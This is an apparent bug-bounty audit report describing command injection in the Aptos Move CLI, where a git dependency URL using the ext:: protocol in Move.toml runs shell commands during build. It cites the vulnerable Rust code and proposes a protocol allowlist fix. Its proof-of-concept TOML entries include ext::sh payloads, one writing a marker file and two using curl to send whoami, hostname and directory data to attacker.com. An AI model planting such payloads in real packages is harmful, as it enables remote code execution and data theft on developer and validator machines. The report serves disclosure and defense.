# Audit Report

## Title
Git Command Injection via Malicious ext:: Protocol in Move Package Dependencies

## Summary
The Move CLI's dependency download mechanism fails to validate git URL protocols before passing them to git subprocess commands. An attacker can craft a malicious Move.toml file containing a git dependency with the `ext::` protocol, which allows arbitrary command execution when a victim builds the package. This enables Remote Code Execution (RCE) on developer machines and potentially validator nodes.

## Finding Description

The vulnerability exists in the Move package dependency resolution flow. When a user runs `move build` or similar commands, the CLI parses the `Move.toml` manifest file to download git dependencies. The code extracts git URLs and revisions from the TOML file without validating the URL protocol scheme. [1](#0-0) 

This triggers the dependency download flow which parses the manifest: [2](#0-1) 

The git URL is extracted from the TOML table as a plain string without protocol validation: [3](#0-2) 

These unsanitized URLs are then passed directly to git subprocess commands: [4](#0-3) 

The git functions execute commands using Rust's `Command::new("git")` API with the URL as an argument: [5](#0-4) 

**Attack Propagation:**

1. Attacker creates a malicious Move package repository with a `Move.toml` containing:
   ```toml
   [dependencies]
   malicious = { git = "ext::sh -c 'curl https://attacker.com/?data=$(whoami)' %s", rev = "main" }
   ```

2. Victim clones the repository and runs `move build`

3. The code parses the git URL without validation and passes it to `Command::new("git").args(["clone", "ext::sh -c ...", ...])`

4. Git interprets the `ext::` protocol and executes the embedded shell command

5. Arbitrary code runs with the victim's privileges, enabling data exfiltration, backdoor installation, or complete system compromise

The vulnerability works because Git's `ext::` protocol is a documented feature that allows custom remote helpers by executing arbitrary commands. Even though Rust's `Command::args()` doesn't invoke a shell, **git itself** interprets and executes the `ext::` protocol handler.

## Impact Explanation

**Critical Severity** - This qualifies for the highest severity category per Aptos bug bounty criteria:

- **Remote Code Execution on validator node**: If a validator operator builds a malicious Move package (e.g., during framework upgrades, testing third-party contracts, or dependency updates), this vulnerability enables complete node compromise. An attacker could steal validator keys, manipulate consensus behavior, or gain persistent access to the validator infrastructure.

- **Developer machine compromise**: Aptos ecosystem developers building untrusted packages face RCE risk, enabling supply chain attacks, credential theft, and lateral movement within development environments.

- **Scope**: Affects all users of the Move CLI tool in the Aptos ecosystem, including core developers, validator operators, and dApp developers.

The only sanitization performed is `url_to_file_name()` for cache directory naming, which doesn't prevent dangerous protocols: [6](#0-5) 

## Likelihood Explanation

**High Likelihood**:

- **Common attack vector**: Developers frequently clone and build packages from GitHub, npm-style package registries, and untrusted sources
- **Low attacker complexity**: Creating a malicious Move.toml requires minimal effort and no special privileges
- **Social engineering feasibility**: Attackers can submit malicious packages as legitimate contributions, dependency updates, or example projects
- **Validator risk**: Operators testing framework changes or building governance proposals could trigger the vulnerability
- **No user warnings**: The git URL appears normal in the TOML file, providing no indication of malicious behavior

## Recommendation

Implement strict protocol validation for git URLs before passing them to subprocess commands. Only allow safe protocols (https, git, ssh).

**Fix in `manifest_parser.rs`:**

```rust
fn parse_dependency(dep_name: &str, tval: TV) -> Result<PM::Dependency> {
    match tval {
        TV::Table(mut table) => {
            // ... existing code ...
            (None, Some(git), None) => {
                let git_url = git
                    .as_str()
                    .ok_or_else(|| anyhow::anyhow!("Git URL not a string"))?;
                
                // SECURITY: Validate git URL protocol
                validate_git_url_protocol(git_url)?;
                
                // ... rest of existing code ...
            },
            // ... rest of match arms ...
        }
    }
}

fn validate_git_url_protocol(url: &str) -> Result<()> {
    let url_lower = url.to_lowercase();
    
    // Check for dangerous protocols
    if url_lower.starts_with("ext::") {
        bail!("Dangerous git protocol 'ext::' is not allowed for security reasons");
    }
    
    // Whitelist safe protocols
    let allowed_prefixes = ["https://", "git://", "ssh://", "git@"];
    let is_safe = allowed_prefixes.iter().any(|prefix| url_lower.starts_with(prefix));
    
    if !is_safe {
        bail!("Git URL must use https://, git://, or ssh:// protocol. Got: {}", url);
    }
    
    Ok(())
}
```

**Additional hardening:**
- Use the git2 library instead of subprocess commands (already used in `move-package-cache`)
- Implement protocol validation at multiple layers (manifest parsing, git execution)
- Add warnings for file:// protocol which could access local file system
- Document safe dependency practices in Move CLI documentation

## Proof of Concept

**Step 1: Create malicious Move package**

Create a directory `malicious-move-package/` with this `Move.toml`:

```toml
[package]
name = "MaliciousPackage"
version = "1.0.0"

[dependencies]
evil = { git = "ext::sh -c 'echo PWNED > /tmp/move-cli-pwned.txt && echo malicious' %s", rev = "main" }

[addresses]
std = "0x1"
```

**Step 2: Trigger vulnerability**

```bash
cd malicious-move-package
move build --fetch-deps-only
```

**Expected result:**

The file `/tmp/move-cli-pwned.txt` is created with content "PWNED", demonstrating arbitrary command execution.

**More severe PoC (for controlled testing only):**

```toml
[dependencies]
exfiltrate = { git = "ext::sh -c 'curl https://attacker.com/?hostname=$(hostname)&user=$(whoami)&pwd=$(pwd)' %s", rev = "main" }
```

This would exfiltrate the hostname, username, and current directory to an attacker-controlled server when building the package, demonstrating the RCE risk and potential for credential theft or validator key compromise.

## Notes

While this vulnerability is in developer tooling rather than consensus/execution layers, it poses a **critical supply chain security risk** to the Aptos ecosystem. Validator operators who build Move packages, core developers reviewing PRs with dependency changes, and ecosystem developers building third-party contracts are all at risk of complete system compromise through this vector.

### Citations

**File:** third_party/move/tools/move-cli/src/base/build.rs (L22-22)
```rust
            config.download_deps_for_package(&rerooted_path, &mut std::io::stdout())?;
```

**File:** third_party/move/tools/move-package/src/lib.rs (L190-200)
```rust
    pub fn download_deps_for_package<W: Write>(&self, path: &Path, writer: &mut W) -> Result<()> {
        let path = SourcePackageLayout::try_find_root(path)?;
        let toml_manifest =
            self.parse_toml_manifest(path.join(SourcePackageLayout::Manifest.path()))?;
        let mutx = PackageLock::strict_lock();
        // This should be locked as it inspects the environment for `MOVE_HOME` which could
        // possibly be set by a different process in parallel.
        let manifest = manifest_parser::parse_source_manifest(toml_manifest)?;
        ResolutionGraph::download_dependency_repos(&manifest, self, &path, writer)?;
        mutx.unlock();
        Ok(())
```

**File:** third_party/move/tools/move-package/src/source_package/manifest_parser.rs (L356-381)
```rust
                (None, Some(git), None) => {
                    let rev_name = match table.remove("rev") {
                        None => bail!("Git revision not supplied for dependency"),
                        Some(r) => Symbol::from(
                            r.as_str()
                                .ok_or_else(|| format_err!("Git revision not a string"))?,
                        ),
                    };
                    // Downloaded packages are of the form <sanitized_git_url>_<rev_name>
                    let git_url = git
                        .as_str()
                        .ok_or_else(|| anyhow::anyhow!("Git URL not a string"))?;
                    let local_path = git_repo_cache_path(git_url, rev_name.as_str());
                    let subdir = PathBuf::from(match table.remove("subdir") {
                        None => "".to_string(),
                        Some(path) => path
                            .as_str()
                            .ok_or_else(|| format_err!("'subdir' not a string"))?
                            .to_string(),
                    });
                    git_info = Some(PM::GitInfo {
                        git_url: Symbol::from(git_url),
                        git_rev: rev_name,
                        subdir: subdir.clone(),
                        download_to: local_path.clone(),
                    });
```

**File:** third_party/move/tools/move-package/src/source_package/manifest_parser.rs (L446-450)
```rust
fn url_to_file_name(url: &str) -> String {
    regex::Regex::new(r"/|:|\.|@")
        .unwrap()
        .replace_all(url, "_")
        .to_string()
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L557-576)
```rust
        if let Some(git_info) = &dep.git_info {
            let git_url = git_info.git_url.as_str();
            let git_rev = git_info.git_rev.as_str();
            let git_path = &git_info.download_to.display().to_string();

            // If there is no cached dependency, download it
            if !git_info.download_to.exists() {
                writeln!(
                    writer,
                    "{} {}",
                    "FETCHING GIT DEPENDENCY".bold().green(),
                    git_url,
                )?;

                // Confirm git is available.
                git::confirm_git_available()?;

                // If the cached folder does not exist, download and clone accordingly
                git::clone(git_url, git_path, dep_name)?;
                git::checkout(git_path, git_rev, dep_name)?;
```

**File:** third_party/move/tools/move-package/src/resolution/git.rs (L27-44)
```rust
pub(crate) fn clone(url: &str, target_path: &str, dep_name: PackageName) -> anyhow::Result<()> {
    let status = Command::new("git")
        .args(["clone", url, target_path])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map_err(|_| {
            anyhow::anyhow!("Failed to clone Git repository for package '{}'", dep_name)
        })?;
    if !status.success() {
        return Err(anyhow::anyhow!(
            "Failed to clone Git repository for package '{}' | Exit status: {}",
            dep_name,
            status
        ));
    }
    Ok(())
}
```
